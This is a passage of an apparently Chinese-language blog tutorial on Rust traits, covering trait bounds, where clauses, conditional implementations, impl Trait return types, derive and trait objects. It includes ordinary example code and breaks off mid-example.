Summary </code>，意思是实现了Summary特征的 item参数</p><h5 id="特征约束"><a href="#特征约束" class="headerlink" title="特征约束"></a>特征约束</h5><p>虽然impl Trait这种语法非常好理解，但它实际上知识一个语法糖</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">notify</span>&lt;T: Summary&gt;(item:&amp;T)&#123;</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;Breaking news!&#123;&#125;&quot;</span>,item.<span class="title function_ invoke__">summarize</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>真正完整书写形式如上所示，形如T：Summary被称为<strong>特征约束</strong></p><p>在复杂的场景，特征约束可以让我们拥有更大的灵活性和语法表现能力，例如一个函数接受两个 <code>impl Summary</code> 的参数：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">notify</span>(item1: &amp;<span class="keyword">impl</span> <span class="title class_">Summary</span>, item2: &amp;<span class="keyword">impl</span> <span class="title class_">Summary</span>) &#123;&#125;</span><br></pre></td></tr></table></figure><p>如果函数两个参数是不同的类型，那么上面的方法很好，只要这两个类型都实现了 <code>Summary</code> 特征即可。但是如果我们想要强制函数的两个参数是同一类型呢？上面的语法就无法做到这种限制，此时我们只能使特征约束来实现：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">notify</span>&lt;T: Summary&gt;(item1: &amp;T, item2: &amp;T) &#123;&#125;</span><br></pre></td></tr></table></figure><p>泛型类型 <code>T</code> 说明了 <code>item1</code> 和 <code>item2</code> 必须拥有同样的类型，同时 <code>T: Summary</code> 说明了 <code>T</code> 必须实现 <code>Summary</code> 特征。</p><h6 id="多重约束"><a href="#多重约束" class="headerlink" title="多重约束"></a>多重约束</h6><p>除了当约束条件，我们还可以指定多个约束条件，例如除了让参数实现Summary特征外 ，还可以让参数实现Display特征以控制它的格式化输出：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">notify</span>(item: &amp;(<span class="keyword">impl</span> <span class="title class_">Summary</span> + Display)) &#123;&#125;</span><br></pre></td></tr></table></figure><p>除了上述的语法糖形式，还能使用特征约束的形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pub fn notify&lt;T: Summary + Display&gt;(item: &amp;T) &#123;&#125;</span><br></pre></td></tr></table></figure><h6 id="Where约束"><a href="#Where约束" class="headerlink" title="Where约束"></a>Where约束</h6><p>当特征约束变得很多时，函数的签名将变得很复杂：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">some_function</span>&lt;T: Display + <span class="built_in">Clone</span>, U: <span class="built_in">Clone</span> + <span class="built_in">Debug</span>&gt;(t: &amp;T, u: &amp;U) <span class="punctuation">-&gt;</span> <span class="type">i32</span> &#123;&#125;</span><br></pre></td></tr></table></figure><p>严格来说，上面的例子还是不够复杂，但是我们还是能对其做一些形式上的改进，通过 <code>where</code>：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">some_function</span>&lt;T, U&gt;(t: &amp;T, u: &amp;U) <span class="punctuation">-&gt;</span> <span class="type">i32</span></span><br><span class="line">    <span class="keyword">where</span> T: Display + <span class="built_in">Clone</span>,</span><br><span class="line">          U: <span class="built_in">Clone</span> + <span class="built_in">Debug</span></span><br><span class="line">&#123;&#125;</span><br></pre></td></tr></table></figure><h6 id="使用特征约束有条件地实现方法或特征"><a href="#使用特征约束有条件地实现方法或特征" class="headerlink" title="使用特征约束有条件地实现方法或特征"></a>使用特征约束有条件地实现方法或特征</h6><p>特征约束，可以让我们在指定类型 + 指定特征的条件下去实现方法，例如：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::fmt::Display;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Pair</span>&lt;T&gt; &#123;</span><br><span class="line">    x: T,</span><br><span class="line">    y: T,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span>&lt;T&gt; Pair&lt;T&gt; &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">new</span>(x: T, y: T) <span class="punctuation">-&gt;</span> <span class="keyword">Self</span> &#123;</span><br><span class="line">        <span class="keyword">Self</span> &#123;</span><br><span class="line">            x,</span><br><span class="line">            y,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span>&lt;T: Display + <span class="built_in">PartialOrd</span>&gt; Pair&lt;T&gt; &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">cmp_display</span>(&amp;<span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">self</span>.x &gt;= <span class="keyword">self</span>.y &#123;</span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">&quot;The largest member is x = &#123;&#125;&quot;</span>, <span class="keyword">self</span>.x);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">println!</span>(<span class="string">&quot;The largest member is y = &#123;&#125;&quot;</span>, <span class="keyword">self</span>.y);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>cmp_display</code> 方法，并不是所有的 <code>Pair&lt;T&gt;</code> 结构体对象都可以拥有，只有 <code>T</code> 同时实现了 <code>Display + PartialOrd</code> 的 <code>Pair&lt;T&gt;</code> 才可以拥有此方法。 该函数可读性会更好，因为泛型参数、参数、返回值都在一起，可以快速的阅读，同时每个泛型参数的特征也在新的代码行中通过<strong>特征约束</strong>进行了约束。</p><p><strong>也可以有条件地实现特征</strong>，例如，标准库为任何实现了 <code>Display</code> 特征的类型实现了 <code>ToString</code> 特征：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">impl</span>&lt;T: Display&gt; <span class="built_in">ToString</span> <span class="keyword">for</span> <span class="title class_">T</span> &#123;</span><br><span class="line">    <span class="comment">// --snip--</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以对任何实现了 <code>Display</code> 特征的类型调用由 <code>ToString</code> 定义的 <code>to_string</code> 方法。例如，可以将整型转换为对应的 <code>String</code> 值，因为整型实现了 <code>Display</code>：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">s</span> = <span class="number">3</span>.<span class="title function_ invoke__">to_string</span>();</span><br></pre></td></tr></table></figure><h5 id="函数返回中的impl-Trait"><a href="#函数返回中的impl-Trait" class="headerlink" title="函数返回中的impl Trait"></a>函数返回中的impl Trait</h5><p>可以通过impl Trait来说明一个函数返回了一个类型，该类型实现了某个特征：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fn returns_summarizable() -&gt; impl Summary &#123;</span><br><span class="line">    Weibo &#123;</span><br><span class="line">        username: String::from(&quot;sunface&quot;),</span><br><span class="line">        content: String::from(</span><br><span class="line">            &quot;m1 max太厉害了，电脑再也不会卡&quot;,</span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>因为 <code>Weibo</code> 实现了 <code>Summary</code>，因此这里可以用它来作为返回值。要注意的是，虽然我们知道这里是一个 <code>Weibo</code> 类型，但是对于 <code>returns_summarizable</code> 的调用者而言，他只知道返回了一个实现了 <code>Summary</code> 特征的对象，但是并不知道返回了一个 <code>Weibo</code> 类型。</p><p>这种 <code>impl Trait</code> 形式的返回值，在一种场景下非常非常有用，那就是返回的真实类型非常复杂，你不知道该怎么声明时（毕竟 Rust 要求你必须标出所有的类型），此时就可以用 <code>impl Trait</code> 的方式简单返回。例如，闭包和迭代器就是很复杂，只有编译器才知道那玩意的真实类型，如果让你写出来它们的具体类型，估计内心有一万只草泥马奔腾，好在你可以用 <code>impl Iterator</code> 来告诉调用者，返回了一个迭代器，因为所有迭代器都会实现 <code>Iterator</code> 特征。</p><p>但是这种返回值方式有一个很大的限制：只能有一更具体的类型，例如</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">returns_summarizable</span>(switch: <span class="type">bool</span>) <span class="punctuation">-&gt;</span> <span class="keyword">impl</span> <span class="title class_">Summary</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> switch &#123;</span><br><span class="line">        Post &#123;</span><br><span class="line">            title: <span class="type">String</span>::<span class="title function_ invoke__">from</span>(</span><br><span class="line">                <span class="string">&quot;Penguins win the Stanley Cup Championship!&quot;</span>,</span><br><span class="line">            ),</span><br><span class="line">            author: <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;Iceburgh&quot;</span>),</span><br><span class="line">            content: <span class="type">String</span>::<span class="title function_ invoke__">from</span>(</span><br><span class="line">                <span class="string">&quot;The Pittsburgh Penguins once again are the best \</span></span><br><span class="line"><span class="string">                 hockey team in the NHL.&quot;</span>,</span><br><span class="line">            ),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Weibo &#123;</span><br><span class="line">            username: <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;horse_ebooks&quot;</span>),</span><br><span class="line">            content: <span class="type">String</span>::<span class="title function_ invoke__">from</span>(</span><br><span class="line">                <span class="string">&quot;of course, as you probably already know, people&quot;</span>,</span><br><span class="line">            ),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上的代码就无法通过编译，因为它返回了两个不同的类型 <code>Post</code> 和 <code>Weibo</code>。</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`if` and `else` have incompatible types</span><br><span class="line">expected struct `Post`, found struct `Weibo`</span><br></pre></td></tr></table></figure><p>报错提示我们 <code>if</code> 和 <code>else</code> 返回了不同的类型。如果想要实现返回不同的类型，需要使用下一章节中的<a href="https://course.rs/basic/trait/trait-object.html">特征对象</a>。</p><h5 id="通过derive派生特征"><a href="#通过derive派生特征" class="headerlink" title="通过derive派生特征"></a>通过derive派生特征</h5><p>形如 <code>#[derive(Debug)]</code> 的代码已经出现了很多次，这种是一种特征派生语法，被 <code>derive</code> 标记的对象会自动实现对应的默认特征代码，继承相应的功能。</p><p>例如 <code>Debug</code> 特征，它有一套自动实现的默认代码，当你给一个结构体标记后，就可以使用 <code>println!(&quot;&#123;:?&#125;&quot;, s)</code> 的形式打印该结构体的对象。</p><p>再如 <code>Copy</code> 特征，它也有一套自动实现的默认代码，当标记到一个类型上时，可以让这个类型自动实现 <code>Copy</code> 特征，进而可以调用 <code>copy</code> 方法，进行自我复制。</p><p>总之，<code>derive</code> 派生出来的是 Rust 默认给我们提供的特征，在开发过程中极大的简化了自己手动实现相应特征的需求，当然，如果你有特殊的需求，还可以自己手动重载该实现。</p><p>详细的 <code>derive</code> 列表参见<a href="https://course.rs/appendix/derive.html">附录-派生特征</a>。</p><h5 id="调用方法需要引入特征"><a href="#调用方法需要引入特征" class="headerlink" title="调用方法需要引入特征"></a>调用方法需要引入特征</h5><p>在一些场景中，使用as关键字做类型转换会有比较大的限制，因为你想要在类型转换上拥有完全的控制，例如处理转换错误，那么你将需要TryInto:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::convert::TryInto;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">  <span class="keyword">let</span> <span class="variable">a</span>: <span class="type">i32</span> = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">let</span> <span class="variable">b</span>: <span class="type">u16</span> = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> <span class="variable">b_</span> = b.<span class="title function_ invoke__">try_into</span>()</span><br><span class="line">            .<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> a &lt; b_ &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Ten is less than one hundred.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码中引入了 <code>std::convert::TryInto</code> 特征，但是却没有使用它，可能有些同学会为此困惑，主要原因在于<strong>如果你要使用一个特征的方法，那么你需要将该特征引入当前的作用域中</strong>，我们在上面用到了 <code>try_into</code> 方法，因此需要引入对应的特征。</p><p>但是 Rust 又提供了一个非常便利的办法，即把最常用的标准库中的特征通过 <a href="https://course.rs/appendix/prelude.html"><code>std::prelude</code></a> 模块提前引入到当前作用域中，其中包括了 <code>std::convert::TryInto</code>，你可以尝试删除第一行的代码 <code>use ...</code>，看看是否会报错。</p><h4 id="特征对象"><a href="#特征对象" class="headerlink" title="特征对象"></a>特征对象</h4><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">returns_summarizable</span>(switch: <span class="type">bool</span>) <span class="punctuation">-&gt;</span> <span class="keyword">impl</span> <span class="title class_">Summary</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> switch &#123;</span><br><span class="line">        Post &#123;</span><br><span class="line">           <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        Weibo &#123;</span><br><span class="line">            <span class="comment">// ...</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Post和Weibo都实现了Summary特征，因此上面的函数识图通过返回impl Summary来返回这两个类型，但是编译器报错了，原因是impl Trait的返回值类型并不支持多种不同类型返回，那我们向返回多种类型，该怎么办</p><p>再来考虑一个问题：现在在做一款游戏，需要将多个对象渲染在屏幕上，这些对象属于不同的类型，存储在列表中，渲染的时候，需要循环该列表并顺序渲染每个对象，在 Rust 中该怎么实现？</p><p>聪明的同学可能已经能想到一个办法，利用枚举：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[derive(Debug)]</span></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">UiObject</span> &#123;</span><br><span class="line">    Button,</span><br><span class="line">    SelectBox,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">objects</span> = [</span><br><span class="line">        UiObject::Button,</span><br><span class="line">        UiObject::SelectBox</span><br><span class="line">    ];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> <span class="variable">o</span> <span class="keyword">in</span> objects &#123;</span><br><span class="line">        <span class="title function_ invoke__">draw</span>(o)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">draw</span>(o: UiObject) &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;:?&#125;&quot;</span>,o);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Bingo，这个确实是一个办法，但是问题来了，如果你的对象集合并不能事先明确地知道呢？或者别人想要实现一个 UI 组件呢？此时枚举中的类型是有些缺少的，是不是还要修改你的代码增加一个枚举成员？</p><p>总之，在编写这个 UI 库时，我们无法知道所有的 UI 对象类型，只知道的是：</p><ul><li>UI 对象的类型不同</li><li>需要一个统一的类型来处理这些对象，无论是作为函数参数还是作为列表中的一员</li><li>需要对每一个对象调用 <code>draw</code> 方法</li></ul><p>在拥有继承的语言中，可以定义一个名为 <code>Component</code> 的类，该类上有一个 <code>draw</code> 方法。其他的类比如 <code>Button</code>、<code>Image</code> 和 <code>SelectBox</code> 会从 <code>Component</code> 派生并因此继承 <code>draw</code> 方法。它们各自都可以覆盖 <code>draw</code> 方法来定义自己的行为，但是框架会把所有这些类型当作是 <code>Component</code> 的实例，并在其上调用 <code>draw</code>。不过 Rust 并没有继承，我们得另寻出路。</p><h5 id="特征对象定义"><a href="#特征对象定义" class="headerlink" title="特征对象定义"></a>特征对象定义</h5><p>在介绍特征对象之前，先来为之前的UI组件定义一个特征:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">trait</span> <span class="title class_">Draw</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">draw</span>(&amp;<span class="keyword">self</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要组件实现了Draw特征，就可以调用Draw方法来进行渲染。假设有一个Button和SelectBox组件实现了Draw特征</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">Button</span> &#123;</span><br><span class="line">    <span class="keyword">pub</span> width: <span class="type">u32</span>,</span><br><span class="line">    <span class="keyword">pub</span> height: <span class="type">u32</span>,</span><br><span class="line">    <span class="keyword">pub</span> label: <span class="type">String</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Draw</span> <span class="keyword">for</span> <span class="title class_">Button</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">draw</span>(&amp;<span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="comment">// 绘制按钮的代码</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">SelectBox</span> &#123;</span><br><span class="line">    width: <span class="type">u32</span>,</span><br><span class="line">    height: <span class="type">u32</span>,</span><br><span class="line">    options: <span class="type">Vec</span>&lt;<span class="type">String</span>&gt;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Draw</span> <span class="keyword">for</span> <span class="title class_">SelectBox</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">draw</span>(&amp;<span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="comment">// 绘制SelectBox的代码</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时，还需要一个动态数组来存储这些UI对象:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">Screen</span> &#123;</span><br><span class="line">    <span class="keyword">pub</span> components: <span class="type">Vec</span>&lt;?&gt;,</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意到上面的?，它的意思是我们应该填入什么类型，在之前的内容中，我们找不到那个类型可以填入，但是因为Button和SelectBox都实现了Draw特征，那我们就可以把Draw特征的对象作为类型，填入数组中</p><p>特征对象指向实现了Draw特征的类型的实力，也就是指向了Button和SelectBox的实例，这种映射关系是存储在一张表中，可以在运行时通过特征对象找到具体调用的类型方法</p><p>可以通过&amp;引用或者Box&lt;T&gt;智能指针来创建特征对象</p><blockquote><p><code>Box&lt;T&gt;</code> 在后面会<a href="https://course.rs/advance/smart-pointer/box.html">详细讲解</a>，大家现在把它当成一个引用即可，只不过它包裹的值会被强制分配在堆上。</p><p><code>dyn</code> 关键字用于表示<strong>动态分发</strong>（dynamic dispatch）的特征对象。它允许你在运行时确定调用哪个方法，而不是在编译时确定。这是 Rust 中实现多态的一种方式，特别是在处理具有共同接口（特征）的不同类型时。</p></blockquote><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">trait</span> <span class="title class_">Draw</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">draw</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">String</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Draw</span> <span class="keyword">for</span> <span class="title class_">u8</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">draw</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">String</span> &#123;</span><br><span class="line">        <span class="built_in">format!</span>(<span class="string">&quot;u8: &#123;&#125;&quot;</span>, *<span class="keyword">self</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span> <span class="title class_">Draw</span> <span class="keyword">for</span> <span class="title class_">f64</span> &#123;</span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">draw</span>(&amp;<span class="keyword">self</span>) <span class="punctuation">-&gt;</span> <span class="type">String</span> &#123;</span><br><span class="line">        <span class="built_in">format!</span>(<span class="string">&quot;f64: &#123;&#125;&quot;</span>, *<span class="keyword">self</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 若 T 实现了 Draw 特征， 则调用该函数时传入的 Box&lt;T&gt; 可以被隐式转换成函数参数签名中的 Box&lt;dyn Draw&gt;</span></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">draw1</span>(x: <span class="type">Box</span>&lt;<span class="keyword">dyn</span> Draw&gt;) &#123;</span><br><span class="line">    <span class="comment">// 由于实现了 Deref 特征，Box 智能指针会自动解引用为它所包裹的值，然后调用该值对应的类型上定义的 `draw` 方法</span></span><br><span class="line">    x.<span class="title function_ invoke__">draw</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">draw2</span>(x: &amp;<span class="keyword">dyn</span> Draw) &#123;</span><br><span class="line">    x.<span class="title function_ invoke__">draw</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="number">1.1f64</span>;</span><br><span class="line">    <span class="comment">// do_something(&amp;x);</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = <span class="number">8u8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// x 和 y 的类型 T 都实现了 `Draw` 特征，因为 Box&lt;T&gt; 可以在函数调用时隐式地被转换为特征对象 Box&lt;dyn Draw&gt; </span></span><br><span class="line">    <span class="comment">// 基于 x 的值创建一个 Box&lt;f64&gt; 类型的智能指针，指针指向的数据被放置在了堆上</span></span><br><span class="line">    <span class="title function_ invoke__">draw1</span>(<span class="type">Box</span>::<span class="title function_ invoke__">new</span>(x));</span><br><span class="line">    <span class="comment">// 基于 y 的值创建一个 Box&lt;u8&gt; 类型的智能指针</span></span><br><span class="line">    <span class="title function_ invoke__">draw1</span>(<span class="type">Box</span>::<span class="title function_ invoke__">new</span>(y));</span><br><span class="line">    <span class="title function_ invoke__">draw2</span>(&amp;x);</span><br><span class="line">    <span class="title function_ invoke__">draw2</span>(&amp;y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码，有几个非常重要的点：</p><ul><li><code>draw1</code> 函数的参数是 <code>Box&lt;dyn Draw&gt;</code> 形式的特征对象，该特征对象是通过 <code>Box::new(x)</code> 的方式创建的</li><li><code>draw2</code> 函数的参数是 <code>&amp;dyn Draw</code> 形式的特征对象，该特征对象是通过 <code>&amp;x</code> 的方式创建的</li><li><code>dyn</code> 关键字只用在特征对象的类型声明上，在创建时无需使用 <code>dyn</code></li></ul><p>因此，可以使用特征对象来代表泛型或具体的类型。</p><p>继续来完善之前的 UI 组件代码，首先来实现 <code>Screen</code>：</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">Screen</span> &#123;</span><br><span class="line">    <span class="keyword">pub</span> components: <span class="type">Vec</span>&lt;<span class="type">Box</span>&lt;<span class="keyword">dyn</span> Draw&gt;&gt;,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 其中存储了一个动态数组，里面的元素类型是Draw特征对象:Box&lt;dyn Draw&gt;，任何实现了Draw特征的类型都可以存放其中</p><p>我们再来为Screen定义run方法，用于将列表中的UI组件渲染到屏幕上</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">impl</span> <span class="title class_">Screen</span> &#123;</span><br><span class="line">    <span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">run</span>(&amp;<span class="keyword">self</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> <span class="variable">component</span> <span class="keyword">in</span> 